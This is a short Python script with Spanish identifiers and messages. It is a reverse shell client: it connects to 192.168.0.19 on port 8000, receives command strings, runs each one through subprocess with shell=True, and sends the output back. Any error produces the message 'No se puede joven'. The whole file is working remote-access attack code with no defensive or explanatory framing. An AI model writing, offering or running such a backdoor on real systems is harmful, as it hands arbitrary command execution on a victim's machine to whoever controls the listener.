import socket
import subprocess

cliente = socket.socket()

try:
    cliente.connect(('192.168.0.19', 8000))
    cliente.send("1".encode("ascii"))

    while True:
        comandoBytes = cliente.recv(1024)
        comandoCodificado = comandoBytes.decode("ascii")
        comando = subprocess.Popen(comandoCodificado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
except:
    print("No se puede joven")